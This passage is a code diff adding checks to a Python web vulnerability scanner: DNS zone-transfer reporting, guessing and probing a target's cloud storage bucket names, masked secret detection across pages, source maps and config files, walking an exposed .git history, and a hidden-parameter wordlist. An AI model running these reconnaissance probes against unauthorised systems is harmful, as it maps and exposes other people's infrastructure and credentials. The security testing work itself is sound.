+                  'The nameserver answered a full zone transfer to an unauthenticated requester — the entire DNS zone (every hostname, mail and service record) is disclosed, mapping the infrastructure for targeted attacks.',
+                  evidence=f"{info['records']} records transferred ({types_txt}); record contents intentionally not stored",
+                  cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
+                  cvss=7.5,
+                  remed='Restrict AXFR to secondary nameservers (TSIG + ACLs) on every authoritative server.',
+                  confidence="confirmed", location=f"dns://{ns}"))
+    ctx.check_meta["axfr"] = {"zone": zone, "status": "evaluated",
+                              "nameservers": rows}
+    ctx.L(f"  [axfr] {zone}: "
+          + ", ".join(f"{r['ns']}={r['status']}" for r in rows))
+
+
+# ------------------------------------------- WS6b (v1.8.0): buckets
+
+_BUCKET_PATTERNS = ("{t}", "{t}-backup", "{t}-backups", "{t}-data",
+                    "{t}-files", "{t}-assets", "{t}-media",
+                    "{t}-uploads", "{t}-static", "{t}-public",
+                    "{t}-prod", "{t}-dev", "{t}-test", "{t}-storage",
+                    "{t}-bucket", "{t}-archive", "backup-{t}",
+                    "{t}backup")
+_BUCKET_CAP = 48
+
+
+def _bucket_names(host):
+    """Candidate bucket names from the target's own domain tokens
+    (decision K4: token-derived patterns only, small fixed set)."""
+    import ipaddress
+    try:
+        ipaddress.ip_address(host or "")
+        return []
+    except ValueError:
+        pass
+    toks = []
+    reg = org_domain(host) or ""
+    for cand in (reg.split(".")[0] if reg else "",
+                 (host or "").split(".")[0]):
+        c = re.sub(r"[^a-z0-9-]", "", (cand or "").lower()).strip("-")
+        if 3 <= len(c) <= 40 and c not in toks:
+            toks.append(c)
+    names = []
+    for t in toks:
+        for pat in _BUCKET_PATTERNS:
+            n = pat.format(t=t)
+            if n not in names:
+                names.append(n)
+    return names[:18]
+
+
+def _bucket_fetch(url):
+    """(status, body) for an absolute URL via the proxy-aware passive
+    fetcher. Lazy import: passive.py imports vulnscan2."""
+    import passive as _passive
+    st, _h, raw = _passive._fetch_bytes(url, timeout=5,
+                                        cap=256 * 1024)
+    return st, (raw or b"").decode("utf-8", "replace")
+
+
+def _classify_bucket(provider, status, body):
+    """-> (verdict, detail): public / exists / absent / unknown.
+    Verdicts rest on provider-signed content (listing documents and
+    error documents), never on the HTTP status alone — a gateway or
+    WAF answering for the provider cannot fabricate them."""
+    body = body or ""
+    if provider == "s3":
+        if status == 200 and "<ListBucketResult" in body:
+            keys = re.findall(r"<Key>([^<]{1,80})</Key>", body)
+            return "public", {"objects": len(keys), "sample": keys[:3]}
+        if "NoSuchBucket" in body:
+            return "absent", {}
+        if "AccessDenied" in body:
+            return "exists", {}
+        return "unknown", {}
+    if provider == "gcs":
+        if status == 200 and '"items"' in body:
+            try:
+                items = json.loads(body).get("items") or []
+                return "public", {
+                    "objects": len(items),
+                    "sample": [str(i.get("name", ""))[:60]
+                               for i in items[:3]]}
+            except Exception:
+                return "public", {"objects": -1, "sample": []}
+        if status == 404 or "notFound" in body:
+            return "absent", {}
+        if status in (401, 403):
+            return "exists", {}
+        return "unknown", {}
+    if provider == "azure":
+        if status == 200 and "EnumerationResults" in body:
+            blobs = re.findall(r"<Name>([^<]{1,80})</Name>", body)
+            return "public", {"objects": len(blobs),
+                              "sample": blobs[:3]}
+        if "ContainerNotFound" in body or "ResourceNotFound" in body \
+                or "The specified container does not exist" in body:
+            return "absent", {}
+        if status in (403, 409) or "AuthenticationFailed" in body:
+            return "exists", {}
+        if status == 404 or status == 0:
+            return "absent", {}
+        return "unknown", {}
+    return "unknown", {}
+
+
+def c_cloud_buckets(ctx, add):
+    """WS6b (v1.8.0, decision K4): cloud storage bucket enumeration
+    (S3 / GCS / Azure Blob). Candidate names derive from the target
+    domain's tokens through a small fixed pattern set; the probe
+    count is hard-capped. Only two outcomes are reported: publicly
+    listable (provider listing document in hand — confirmed) and
+    exists-but-private (provider access-denied document — inventory
+    candidate, no exposure claimed)."""
+    names = _bucket_names(ctx.client.host or "")
+    if not names:
+        ctx.L("  [buckets] no domain tokens (IP-literal target) — "
+              "bucket enumeration not evaluated")
+        return
+    probed = [0]
+    publics, exists = [], []
+
+    def _hit(provider, label, url):
+        if probed[0] >= _BUCKET_CAP or ctx.cancelled():
+            return
+        probed[0] += 1
+        st, body = _bucket_fetch(url)
+        verdict, det = _classify_bucket(provider, st, body)
+        if verdict == "public":
+            publics.append((provider, label, url, det))
+        elif verdict == "exists":
+            exists.append((provider, label, url))
+
+    for name in names:
+        _hit("s3", name, f"https://{name}.s3.amazonaws.com/")
+        _hit("gcs", name,
+             f"https://storage.googleapis.com/storage/v1/b/{name}"
+             "/o?maxResults=5")
+    accts = []
+    for name in names[:6]:
+        a = re.sub(r"[^a-z0-9]", "", name)[:24]
+        if len(a) >= 3 and a not in accts:
+            accts.append(a)
+    for a in accts:
+        for cont in ("data", "files"):
+            _hit("azure", f"{a}/{cont}",
+                 f"https://{a}.blob.core.windows.net/{cont}"
+                 "?resttype=container&comp=list&maxresults=5")
+    for provider, label, url, det in publics:
+        sample = ", ".join(det.get("sample") or []) or "-"
+        add(F("HIGH", f"Cloud storage bucket publicly listable: {label} ({provider})",
+              'An anonymous request listed this bucket\'s contents — object names (and typically the objects themselves) are exposed to the internet. The verdict rests on the provider-signed listing document, not on the HTTP status alone.',
+              evidence=f"anonymous listing returned {det.get('objects')} object(s); sample: {sample}",
+              cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
+              cvss=7.5,
+              remed='Disable public listing and public access on the bucket; audit object ACLs; apply least-privilege bucket policies.',
+              confidence="confirmed", location=url))
+    for provider, label, url in exists[:5]:
+        add(F("INFO", f"Cloud storage bucket exists (not publicly listable): {label} ({provider})",
+              'The provider confirms a bucket with this name exists but denies anonymous listing — recorded for asset inventory only; no exposure is claimed.',
+              evidence="provider returned an access-denied document to an anonymous listing attempt",
+              cwe="CWE-200", owasp="A05:2021", cvss=0.0,
+              remed="No action required if the bucket is intentional and private.",
+              confidence="candidate", location=url))
+    if len(exists) > 5:
+        ctx.L(f"  [buckets] +{len(exists) - 5} more existing-but-"
+              "private buckets (suppressed for noise)")
+    ctx.check_meta["cloud_buckets"] = {
+        "candidates": len(names), "probed": probed[0],
+        "public": [f"{p}:{l}" for p, l, _u, _d in publics],
+        "exists_private": [f"{p}:{l}" for p, l, _u in exists]}
+    ctx.L(f"  [buckets] probed {probed[0]} candidate buckets: "
+          f"{len(publics)} publicly listable, {len(exists)} "
+          "existing-but-private")
 
 
 def c_default_credentials(ctx, add):
@@ -2943,24 +5109,952 @@ def c_subdomain_takeover(ctx, add):
             return
 
 
+_JS_BUNDLE_HINTS = ("app", "main", "bundle", "index", "chunk")
+
+
+def _js_priority(path):
+    name = path.rsplit("/", 1)[-1].lower()
+    return (0 if any(h in name for h in _JS_BUNDLE_HINTS) else 1, path)
+
+
+def _pem_material_parses(text, start):
+    """Extract the PEM block beginning at `start` and parse it with
+    `cryptography`. Returns the key class name when the material is a
+    genuine, complete private key; None when it does not parse."""
+    end_m = re.search(r"-----END [A-Z0-9 ]*PRIVATE KEY-----",
+                      text[start:start + 16384])
+    if not end_m:
+        return None
+    block = text[start:start + end_m.end()]
+    try:
+        from cryptography.hazmat.primitives.serialization import \
+            load_pem_private_key
+        key = load_pem_private_key(block.encode("utf-8", "replace"),
+                                   password=None)
+        return type(key).__name__
+    except Exception:
+        return None
+
+
+def _aws_pair_secret(text, pos):
+    """Look for a 40-char AWS secret near an access key ID (same file,
+    with an explicit 'secret' context). Returns the masked secret."""
+    win = text[max(0, pos - 2500):pos + 2500]
+    for m in AWS_SECRET_RE.finditer(win):
+        ctxw = win[max(0, m.start() - 160):m.start()]
+        if re.search(r"(?i)secret", ctxw):
+            return _secret_mask(m.group(0))
+    return None
+
+
+_NOT_VALIDATED = (' The value was NOT validated against its provider '
+                  '(no provider contact is ever made); whether it is '
+                  'still active must be verified by its owner.')
+
+
+# --- WS5 (v1.7.0): secret context scoring + operator baseline --------
+_TEST_CTX_RE = re.compile(
+    r"(?i)\b(test|testing|example|fixture|sample|demo|dummy|mock|"
+    r"placeholder|fake|seed data)\b")
+_PROD_CTX_RE = re.compile(r"(?i)\b(production|prod|live)\b")
+_TIER_DOWN = {"confirmed": "probable", "probable": "candidate",
+              "candidate": "candidate"}
+
+
+def _secret_context_adjust(body, start, end, location, config_style,
+                           conf, note):
+    """Context scoring: an explicit test/example/fixture context
+    demotes the tier one step; a production/config context retains it.
+    The decision is always written into the evidence note — never
+    applied silently."""
+    win = body[max(0, start - 160):end + 160]
+    loc = (location or "").lower()
+    if _TEST_CTX_RE.search(win) or _TEST_CTX_RE.search(loc):
+        return (_TIER_DOWN.get(conf, conf),
+                (note + "; " if note else "")
+                + "context: test/example/fixture wording around the "
+                  "value — tier demoted one step")
+    if config_style or ".env" in loc or "config" in loc \
+            or _PROD_CTX_RE.search(win):
+        return (conf, (note + "; " if note else "")
+                + "context: production/config — tier retained")
+    return conf, note
+
+
+def _baseline_map(ctx):
+    """Operator secret baseline (WS5) from scan opts, as
+    {sha256_hex: entry}. Entries are hashes only — raw values never
+    enter the engine or the store."""
+    out = {}
+    try:
+        entries = (ctx.opts or {}).get("secret_baseline") or []
+    except Exception:
+        entries = []
+    for e in entries:
+        h = (e or {}).get("hash")
+        if h:
+            out[h] = e
+    return out
+
+
+def _apply_baseline(f, state, val):
+    """Mark a finding dict when its exact value is on the operator
+    baseline. K3: the finding STAYS in the list, visibly labelled;
+    store.save_scan persists it with status 'suppressed'."""
+    bmap = (state or {}).get("baseline") or {}
+    if not bmap or not val:
+        return f
+    h = hashlib.sha256(val.encode("utf-8", "replace")).hexdigest()
+    e = bmap.get(h)
+    if e:
+        f["baseline_suppressed"] = {
+            "label": e.get("label", ""), "reason": e.get("reason", ""),
+            "hash": h[:12]}
+        f["evidence"] += (
+            f" — OPERATOR BASELINE MATCH (sha256 {h[:12]}…): baselined "
+            f"as '{e.get('label', '')}' — displayed with status "
+            "suppressed (baseline), per policy K3")
+    return f
+
+
+def _emit_secret(add, det, val, location, state, confidence, note,
+                 layer="raw"):
+    key = (det["kind"], _secret_mask(val), location)
+    if key in state["seen"] or state["count"] >= state.get("cap", 10):
+        return
+    state["seen"].add(key)
+    state.setdefault("emitted", set()).add((_secret_mask(val), location))
+    ev = f"{_secret_mask(val)} in {location}"
+    if layer != "raw":
+        ev += f" (found in {layer} content)"
+    if note:
+        ev += f" — {note}"
+    _f = F(det["severity"], det["title"], det["desc"] + _NOT_VALIDATED,
+           evidence=ev, cwe="CWE-798",
+           owasp="A07:2021 Identification & Authentication Failures",
+           cvss=det["cvss"],
+           remed='Revoke/rotate this credential now and move it to a backend or a secrets manager; never ship secrets in client-side code.',
+           confidence=confidence, location=location)
+    add(_apply_baseline(_f, state, val))
+    state["count"] += 1
+
+
+def _scan_secrets_text(add, text, location, state, layer="raw",
+                       config_style=False):
+    """Scan one text with the v2 detector set (secretpatterns.DETECTORS_V2)
+    plus the generic Tier B assignment pattern. Structural validators
+    run LOCALLY only (CRC checksum, PEM parse, JWT decode, AWS pairing);
+    no provider is ever contacted (decision D5/K1)."""
+    if not text or state["count"] >= state.get("cap", 10):
+        return
+    body = text[:512 * 1024]
+    claimed = []  # spans already identified by a specific-format detector;
+                  # generic/context detectors must not re-claim them
+    for det in DETECTORS_V2:
+        if state["count"] >= state.get("cap", 10):
+            return
+        kind = det["kind"]
+        for m in det["regex"].finditer(body):
+            if state["count"] >= state.get("cap", 10):
+                return
+            if any(m.start() < e and s < m.end() for s, e in claimed):
+                continue
+            val = m.group(0)
+            if is_denied_secret(val):
+                continue
+            if det["context"] is not None:
+                win = body[max(0, m.start() - 160):m.end() + 160]
+                if not det["context"].search(win):
+                    continue
+            conf, note = det["base"], ""
+            v = det["validator"]
+            if v == "github_crc":
+                ok = github_token_structurally_valid(val)
+                if ok is True:
+                    conf = "probable"
+                    note = "token checksum (CRC32) verified locally — format is structurally genuine"
+                elif ok is False:
+                    conf = _TIER_DOWN.get(conf, conf)
+                    note = "token checksum does NOT verify — likely altered or fabricated; tier demoted one step per policy K4 (a failed checksum never deletes a finding)"
+                else:
+                    note = "token format is not checksum-verifiable"
+            elif v == "pem_parse":
+                keytype = _pem_material_parses(body, m.start())
+                if keytype:
+                    conf = "confirmed"
+                    note = (f"private key material parses as a valid {keytype} "
+                            "— the EXPOSURE is confirmed; a private key has "
+                            "no provider liveness to verify")
+                else:
+                    note = "key header present but the material does not parse (truncated or corrupt)"
+            elif v == "jwt_struct":
+                if len(val) < 80:
+                    continue
+                parsed = parse_jwt(val)
+                if parsed is None:
+                    continue  # three base64 segments, but not a real JWT
+                if parsed["alg"] == "none" or parsed["signature_empty"]:
+                    _c2, _n2 = _secret_context_adjust(
+                        body, m.start(), m.end(), location, config_style,
+                        "probable",
+                        "JWT uses alg=none / carries no signature")
+                    _emit_secret(add, det, val, location, state, _c2,
+                                 _n2, layer)
+                    claimed.append(m.span())
+                    continue
+                conf = "probable"
+                bits = [f"JWT structure decoded locally (alg={parsed['alg']}"]
+                if parsed.get("signature_wellformed"):
+                    bits.append("signature segment is well-formed "
+                                "base64url (format check only — NOT "
+                                "cryptographically verified)")
+                elif not parsed["signature_empty"]:
+                    bits.append("signature segment is not well-formed "
+                                "base64url")
+                iss = parsed["claims"].get("iss")
+                exp = parsed["claims"].get("exp")
+                if iss:
+                    bits.append(f"iss={str(iss)[:40]}")
+                if isinstance(exp, (int, float)):
+                    bits.append(f"exp={int(exp)}")
+                note = ", ".join(bits) + ")"
+            elif v == "aws_pair":
+                pair = _aws_pair_secret(body, m.start())
+                if pair:
+                    conf = "confirmed"
+                    note = (f"complete credential pair: this access key ID "
+                            f"appears together with a 40-char secret ({pair}) "
+                            "in the same file — the EXPOSURE is confirmed; "
+                            "liveness NOT verified")
+            elif v == "gcp_sa":
+                if '"private_key"' not in body:
+                    continue
+                conf = "probable"
+                note = "service-account document structure present (type + private_key fields)"
+            elif v == "luhn":
+                if luhn_valid(re.sub(r"\D", "", val)):
+                    conf = "probable"
+                    note = "Luhn checksum PASSES locally — the value is structurally a valid payment card number (offline check only; never validated with an issuer)"
+                else:
+                    conf = _TIER_DOWN.get(det["base"], "candidate")
+                    note = "Luhn checksum FAILS — tier demoted one step per policy K4 (a failed checksum never deletes a finding); likely a look-alike number, kept for audit"
+            elif v == "bip39":
+                _bs = bip39_phrase_status(val)
+                if _bs is None or _bs == "not_mnemonic":
+                    continue  # not a BIP-39 candidate at all
+                if _bs == "valid":
+                    conf = "probable"
+                    note = "BIP-39 checksum VERIFIES locally — a structurally valid mnemonic seed phrase (offline check only)"
+                else:
+                    conf = "candidate"
+                    note = "every word is a BIP-39 wordlist word but the embedded checksum does NOT verify — tier demoted per policy K4 (never removed)"
+            conf, note = _secret_context_adjust(
+                body, m.start(), m.end(), location, config_style,
+                conf, note)
+            claimed.append(m.span())
+            _emit_secret(add, det, val, location, state, conf, note, layer)
+    for m in WEB_GENERIC_SECRET_RE.finditer(body):
+        if state["count"] >= state.get("cap", 10):
+            return
+        val = m.group(2)
+        if is_denied_secret(val) or shannon_entropy(val) < 3.5:
+            continue
+        key = ("generic", _secret_mask(val), location)
+        if key in state["seen"] or \
+                (_secret_mask(val), location) in state.get("emitted", set()):
+            continue
+        state["seen"].add(key)
+        add(_apply_baseline(F("LOW", "Hardcoded credential indication in web content",
+              f"A credential assignment ({m.group(1)}) with a high-entropy value was found in content served to any visitor. Manual verification is required to determine whether the value is a real, still-active credential. The value was NOT validated against any provider.",
+              evidence=f"{m.group(1)} = {_secret_mask(val)} in {location}",
+              cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
+              cvss=3.7,
+              remed='Manually verify whether this value is an active credential; if so, revoke it and move it to a backend or a secrets manager.',
+              confidence="candidate", location=location), state, val))
+        state["count"] += 1
+    if config_style:
+        for m in _ENV_STYLE_RE.finditer(body):
+            if state["count"] >= state.get("cap", 10):
+                return
+            val = m.group(2).strip("\"'")
+            if is_denied_secret(val) or shannon_entropy(val) < 3.5:
+                continue
+            if val.startswith("base64:") and len(val) < 24:
+                continue  # Laravel-style APP_KEY placeholder shapes
+            key = ("envstyle", _secret_mask(val), location)
+            if key in state["seen"] or \
+                    (_secret_mask(val), location) in state.get("emitted", set()):
+                continue
+            state["seen"].add(key)
+            add(_apply_baseline(F("LOW", "Credential value in exposed configuration file",
+                  f"A credential assignment ({m.group(1)}) with a high-entropy value was found inside a publicly served configuration file. Manual verification is required; the value was NOT validated against any provider.",
+                  evidence=f"{m.group(1)} = {_secret_mask(val)} in {location}",
+                  cwe="CWE-200", owasp="A05:2021 Security Misconfiguration",
+                  cvss=3.7,
+                  remed='Remove the file from the webroot and rotate the credential if it is real.',
+                  confidence="candidate", location=location), state, val))
+            state["count"] += 1
+
+
+_ENV_STYLE_RE = re.compile(
+    r"(?im)^\s*(?:export\s+)?([A-Za-z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD)[A-Za-z0-9_]*)"
+    r"\s*=\s*(\S{12,64})\s*$")
+
+
+_B64_BLOB_RE = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")
+_HEX_BLOB_RE = re.compile(r"(?<![0-9a-fA-F])[0-9a-fA-F]{40,}(?![0-9a-fA-F])")
+
+
+def _printable_ratio(raw):
+    if not raw:
+        return 0.0
+    good = sum(1 for b in raw if 32 <= b < 127 or b in (9, 10, 13))
+    return good / len(raw)
+
+
+def _decoded_variants(text):
+    """Decoder layers (design B2): URL-decoding, unicode escapes, JS
+    string concatenation, and printable base64/hex blobs are decoded
+    and re-scanned. Hard caps keep the work per file bounded."""
+    variants = []
+    from urllib.parse import unquote
+    try:
+        u = unquote(text)
+        if u != text:
+            variants.append(("url-decoded", u))
+    except Exception:
+        pass
+    if "\\u" in text or "\\x" in text:
+        try:
+            variants.append(("unicode-unescaped",
+                             text.encode("utf-8", "replace").decode(
+                                 "unicode_escape", "replace")))
+        except Exception:
+            pass
+    if '" +' in text or "' +" in text or '+ "' in text or "+ '" in text:
+        joined = re.sub(r"[\"']\s*\+\s*[\"']", "", text)
+        if joined != text:
+            variants.append(("concatenation-joined", joined))
+    seen_dec = set()
+    for m in _B64_BLOB_RE.finditer(text):
+        if len(variants) >= 16:
+            break
+        blob = m.group(0)
+        try:
+            raw = base64.b64decode(blob + "=" * (-len(blob) % 4))
+        except Exception:
+            continue
+        if len(raw) < 8 or _printable_ratio(raw) < 0.95:
+            continue
+        s = raw.decode("utf-8", "replace")
+        if s not in seen_dec:
+            seen_dec.add(s)
+            variants.append(("base64-decoded", s))
+    for m in _HEX_BLOB_RE.finditer(text):
+        if len(variants) >= 20:
+            break
+        try:
+            raw = bytes.fromhex(m.group(0))
+        except Exception:
+            continue
+        if len(raw) < 10 or _printable_ratio(raw) < 0.95:
+            continue
+        s = raw.decode("utf-8", "replace")
+        if s not in seen_dec:
+            seen_dec.add(s)
+            variants.append(("hex-decoded", s))
+    return variants
+
+
+def _scan_secrets_in(add, text, location, state, config_style=False):
+    """Scan one text (raw + decoder layers) for secrets. state =
+    {seen, count, cap} shared across sources within one scan.
+    Evidence is ALWAYS masked."""
+    if not text or state["count"] >= state.get("cap", 10):
+        return
+    _scan_secrets_text(add, text, location, state, "raw", config_style)
+    for layer, variant in _decoded_variants(text[:512 * 1024]):
+        if state["count"] >= state.get("cap", 10):
+            return
+        # Variant findings carry the layer as a location fragment (same
+        # convention as source maps) so run-level dedup by
+        # (title, location) cannot swallow them as duplicates of the
+        # raw-layer finding for the same file.
+        _scan_secrets_text(add, variant, f"{location}#{layer}", state,
+                           layer, config_style)
+
+
+def _scan_source_maps(ctx, add, js_url, js_body, state):
+    """Source-map phase (design B3.1, deferred from v1.2.0): fetch the
+    map for a JS file (sourceMappingURL or <url>.map) and scan each
+    sourcesContent entry — original sources are where secrets linger."""
+    candidates = []
+    m = re.search(r"sourceMappingURL=([^\s\"']+)", js_body or "")
+    if m:
+        from urllib.parse import urljoin
+        candidates.append(urljoin(js_url, m.group(1)))
+    candidates.append(js_url + ".map")
+    for map_url in candidates:
+        if state["count"] >= state.get("cap", 10):
+            return
+        path = urlparse(map_url).path
+        if urlparse(map_url).query:
+            path += "?" + urlparse(map_url).query
+        r = ctx.client.get(path)
+        if r.status != 200 or ctx.is_missing(r) or not (r.body or ""):
+            continue
+        try:
+            doc = json.loads(r.body)
+        except Exception:
+            continue
+        sources = doc.get("sources") or []
+        contents = doc.get("sourcesContent") or []
+        for i, content in enumerate(contents):
+            if state["count"] >= state.get("cap", 10):
+                return
+            if not content:
+                continue
+            name = sources[i] if i < len(sources) else f"source[{i}]"
+            _scan_secrets_in(add, content,
+                             f"{path}#{name}", state)
+        return  # one map per JS file is enough
+
+
+# Paths whose signature-verified bodies c_sensitive_files feeds into
+# the secrets engine (design B3.3).
+SECRET_FEED_PATHS = {"/.env", "/.env.bak", "/.env.local",
+                     "/wp-config.php.bak", "/wp-config.php~",
+                     "/config.php.bak", "/.htpasswd"}
+
+# Paths whose signature-verified bodies c_sensitive_files feeds into
+# the dependency-manifest miner (WS2, v1.10.0).
+DEP_FEED_PATHS = {"/package.json", "/package-lock.json",
+                  "/composer.json", "/composer.lock",
+                  "/Gemfile.lock", "/requirements.txt", "/Pipfile.lock",
+                  "/pom.xml", "/build.gradle", "/packages.config"}
+
+
+def c_exposed_secrets(ctx, add):
+    """Exposed secrets in web content — Secrets Engine v2 (v1.3.0):
+    72 provider detectors with local structural validation (GitHub CRC
+    checksum, private-key parsing, JWT decoding, AWS pairing), layered
+    decoders (base64/hex/URL/unicode/concatenation), source-map
+    sourcesContent, and the bodies of signature-verified sensitive
+    files. Values are never validated against providers (D5/K1) and
+    never shown in full."""
+    surf = ctx.surface(full=True)
+    state = {"seen": set(), "count": 0, "cap": 10,
+             "baseline": _baseline_map(ctx)}
+    home = surf.homepage or ctx.client.get("/")
+    if home is not None and (home.body or ""):
+        _scan_secrets_in(add, home.body, "/", state)
+    for path, body in getattr(ctx, "_secret_feed", []) or []:
+        if state["count"] >= state["cap"]:
+            break
+        _scan_secrets_in(add, body, path, state, config_style=True)
+    urls = sorted(getattr(surf, "js_urls", []) or [], key=_js_priority)[:12]
+    for u in urls:
+        if ctx.cancelled() or state["count"] >= state["cap"]:
+            break
+        r = ctx.client.get(u)
+        if r.status != 200 or ctx.is_missing(r) or not (r.body or ""):
+            continue
+        _scan_secrets_in(add, r.body, u, state)
+        _scan_source_maps(ctx, add, u, r.body, state)
+    if state["count"]:
+        ctx.L(f"  [secrets] {state['count']} exposed-secret findings (values masked, structurally validated locally, never provider-validated)")
+
+
+# ------------------------------------------------------------ git history
+
+_GIT_MAX_OBJECTS = 60
+_GIT_MAX_TOTAL = 2 * 1024 * 1024
+_GIT_MAX_BLOB = 256 * 1024
+
+
+def _git_fetch_raw(ctx, path):
+    """Raw-bytes GET for .git objects. netclient's Resp body is
+    text-decoded (utf-8/replace), which would corrupt zlib object
+    data, so this reuses passive._fetch_bytes (same proxy rules)."""
+    import passive as _passive
+    from urllib.parse import urljoin
+    base = ctx.target if ctx.target.endswith("/") else ctx.target + "/"
+    status, _hdrs, raw = _passive._fetch_bytes(
+        urljoin(base, path.lstrip("/")), timeout=8, verify=False,
+        cap=_GIT_MAX_BLOB)
+    return status, raw
+
+
+def _git_object(ctx, sha, budget):
+    import zlib
+    if budget["objects"] >= _GIT_MAX_OBJECTS or budget["bytes"] >= _GIT_MAX_TOTAL:
+        return None, None
+    status, raw = _git_fetch_raw(ctx, f"/.git/objects/{sha[:2]}/{sha[2:]}")
+    if status != 200 or not raw:
+        return None, None
+    budget["objects"] += 1
+    budget["bytes"] += len(raw)
+    try:
+        data = zlib.decompress(raw)
+    except Exception:
+        return None, None
+    hdr, sep, payload = data.partition(b"\x00")
+    if not sep:
+        return None, None
+    parts = hdr.split(b" ")
+    if len(parts) != 2:
+        return None, None
+    return parts[0].decode("ascii", "replace"), payload
+
+
+def _git_parse_commit(payload):
+    tree, parents = None, []
+    for line in payload.split(b"\n"):
+        if not line:
+            break
+        if line.startswith(b"tree "):
+            tree = line[5:].decode("ascii", "replace").strip()
+        elif line.startswith(b"parent "):
+            parents.append(line[7:].decode("ascii", "replace").strip())
+    return tree, parents
+
+
+def _git_parse_tree(payload):
+    entries = []
+    i = 0
+    while i < len(payload):
+        sp = payload.find(b" ", i)
+        if sp < 0:
+            break
+        nul = payload.find(b"\x00", sp)
+        if nul < 0 or nul + 21 > len(payload):
+            break
+        mode = payload[i:sp].decode("ascii", "replace")
+        name = payload[sp + 1:nul].decode("utf-8", "replace")
+        sha = payload[nul + 1:nul + 21].hex()
+        entries.append((mode, name, sha))
+        i = nul + 21
+    return entries
+
+
+def c_git_secrets(ctx, add):
+    """Secrets in exposed .git history (design B3.2): when /.git is
+    confirmed exposed, walk loose objects with a pure-Python zlib
+    walker (HEAD -> ref -> commits -> trees -> blobs, plus logs/HEAD
+    history) and run the Secrets Engine over historical blobs. The
+    git binary is never invoked. Hard caps bound the walk."""
+    head = ctx.client.get("/.git/HEAD")
+    if head.status != 200 or not (head.body or "") or ctx.is_missing(head):
+        return
+    head_body = head.body.strip()
+    if not re.match(r"^(ref:\s*refs/[\w./-]+|[0-9a-f]{40})$", head_body):
+        return
+    ctx.L("  [git] /.git confirmed exposed — walking loose object history")
+    seeds = []
+    if head_body.startswith("ref:"):
+        ref = head_body[4:].strip()
+        r = ctx.client.get("/.git/" + ref)
+        if r.status == 200 and r.body:
+            sha = r.body.strip().split()[0] if r.body.strip() else ""
+            if re.fullmatch(r"[0-9a-f]{40}", sha):
+                seeds.append(sha)
+        pr = ctx.client.get("/.git/packed-refs")
+        if pr.status == 200 and pr.body:
+            for line in pr.body.splitlines():
+                parts = line.strip().split(" ")
+                if len(parts) == 2 and re.fullmatch(r"[0-9a-f]{40}", parts[0]):
+                    seeds.append(parts[0])
+    else:
+        seeds.append(head_body)
+    logs = ctx.client.get("/.git/logs/HEAD")
+    if logs.status == 200 and logs.body:
+        for line in logs.body.splitlines():
+            for tok in line.split(" ")[:2]:
+                if re.fullmatch(r"[0-9a-f]{40}", tok) and tok != "0" * 40:
+                    seeds.append(tok)
+    state = {"seen": set(), "count": 0, "cap": 8,
+             "baseline": _baseline_map(ctx)}
+    budget = {"objects": 0, "bytes": 0}
+    visited = set()
+    commit_queue = list(dict.fromkeys(seeds))
+    while commit_queue and not ctx.cancelled():
+        sha = commit_queue.pop(0)
+        if sha in visited:
+            continue
+        visited.add(sha)
+        otype, payload = _git_object(ctx, sha, budget)
+        if otype != "commit" or payload is None:
+            continue
+        tree_sha, parents = _git_parse_commit(payload)
+        for p in parents:
+            if p not in visited:
+                commit_queue.append(p)
+        # Walk this commit's tree (recursive, path-aware).
+        tree_stack = [(tree_sha, "")]
+        while tree_stack and not ctx.cancelled():
+            tsha, prefix = tree_stack.pop()
+            if not tsha or tsha in visited:
+                continue
+            visited.add(tsha)
+            otype, payload = _git_object(ctx, tsha, budget)
+            if otype != "tree" or payload is None:
+                continue
+            for mode, name, esha in _git_parse_tree(payload):
+                path = f"{prefix}{name}"
+                if mode == "40000":
+                    tree_stack.append((esha, path + "/"))
+                elif esha not in visited:
+                    visited.add(esha)
+                    otype, blob = _git_object(ctx, esha, budget)
+                    if otype == "blob" and blob:
+                        text = blob[:_GIT_MAX_BLOB].decode("utf-8", "replace")
+                        _scan_secrets_in(
+                            add, text,
+                            f"/.git@{sha[:10]}:{path}", state,
+                            config_style=True)
+                        if state["count"] >= state["cap"]:
+                            break
+            if state["count"] >= state["cap"]:
+                break
+    if state["count"]:
+        ctx.L(f"  [git] {state['count']} secret finding(s) in .git history "
+              f"({budget['objects']} objects walked)")
+
+
+HIDDEN_PARAM_CATEGORIES = [
+    ("debug/development", ["debug", "test", "dev", "admin", "internal",
+                           "verbose", "trace", "staging"]),
+    ("access & data view", ["role", "is_admin", "user_id", "account_id",
+                            "view", "preview", "draft", "status", "mode",
+                            "format", "output", "raw"]),
+    ("navigation & content", ["page", "limit", "offset", "sort", "order",
+                              "filter", "lang", "locale", "template", "theme",
+                              "redirect", "return", "callback", "source",
+                              "ref", "id", "file", "path", "category",
+                              "section"]),
+    ("miscellaneous", ["q2", "json", "xml", "data", "show", "display",
+                       "details", "full"]),
+]
+HIDDEN_PARAM_WORDLIST = [n for _c, names in HIDDEN_PARAM_CATEGORIES for n in names]
+HIDDEN_PARAM_CATEGORY = {n: c for c, names in HIDDEN_PARAM_CATEGORIES for n in names}
+
+
+def _hidden_differs(resp, base_body):
+    """Respons 'berbeda' dari baseline: kemiripan < 0.92 DAN selisih
+    panjang >= 5% (mengikuti ambang desain 3.3)."""
+    body = resp.body or ""
+    if similarity(body, base_body) >= 0.92:
+        return False
+    return abs(len(body) - len(base_body)) >= max(24, int(len(base_body) * 0.05))
+
+
+def _hidden_endpoints(ctx, surf):
+    """Maks 3 endpoint GET: basis param_urls -> action form GET ->
+    GUESS_PARAM_URLS yang terverifikasi ada (urutan prioritas desain)."""
+    eps, seen = [], set()
+    for pq in surf.param_urls:
+        b = pq.split("?")[0]
+        if b not in seen:
+            seen.add(b)
+            eps.append(pq)
+        if len(eps) >= 3:
+            return eps
+    for form in surf.forms:
+        if form["method"] == "GET" and form["action"] not in seen:
+            seen.add(form["action"])
+            eps.append(form["action"])
+        if len(eps) >= 3:
+            return eps
+    for pq in crawl_mod.GUESS_PARAM_URLS:
+        b = pq.split("?")[0]
+        if b in seen:
+            continue
+        r = ctx.client.get(pq)
+        if r.status and not ctx.is_missing(r):
+            seen.add(b)
+            eps.append(pq)
+        if len(eps) >= 3:
+            return eps
+    return eps
+
+
+def c_hidden_params(ctx, add):
+    """Hidden parameter discovery (Priority 1, finding-only v1): batch
+    12 nama + bisect ala ParamMiner, kontrol nama sampah wajib, nilai
